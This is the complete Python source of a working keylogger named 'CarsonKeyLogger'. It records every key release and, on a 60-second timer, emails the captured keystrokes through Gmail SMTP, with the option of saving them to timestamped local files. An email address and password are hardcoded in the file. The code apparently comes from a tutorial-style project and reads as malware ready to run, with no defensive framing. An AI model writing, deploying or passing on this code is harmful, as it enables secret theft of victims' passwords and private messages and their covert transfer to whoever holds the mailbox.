import keyboard # for keylogs
import smtplib # for sending emails through SMTP Protocol
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 #in seconds, 60 being one minute
EMAIL_ADDRESS = "carsonKeyLogger@gmail.com"
EMAIL_PASSWORD = "carsonKeylogger1234!"


class CarsonKeyLogger:
    def __init__(self, interval, report_method="email"):
        #passing SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        #This is a string that contains the logs of
        #all the keystrokes within self.interval
        self.log = ""
        #record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        # This callback invoked whenever a keybard event occures
        name = event.name
        if len(name) > 1:
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add new line whenever an enter is pressed
                name = "[ENTER}\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        #Finally, add info to global variable self.log
        self.log += name 
    def update_filename(self):
        #construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        #This method makes a log file in the current directory that contains the current keylogs in the 'self.log' variable
        #open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            #write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        #manages a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        #connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        #login to the email account
        server.login(email, password)
        #send the actual email
        server.sendmail(email, email, message)
        #terminates session
        server.quit()
        
    def report(self):
        #this function get called every 'self.interval'
        #It sends the keylogs and resets the 'self.log'
        if self.log:
            #if there is someing in log, report it
            self.end_dt = datetime.now()
            #update 'self.filename'
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            #if you want to print in the console, uncomment below line
            #print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        #set the thread as daemon (dies when main thread dies)
        timer.daemon = True
        timer.start()
        
    def start(self):
        #record the start datetime
        self.start_dt = datetime.now()
        #start the keylogger
        keyboard.on_release(callback=self.callback)
        #start reporting the keylogs
        self.report()
        #block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    #if you want a keylogger to send to your email
    keylogger = CarsonKeyLogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    #keylogger = CarsonKeyLogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()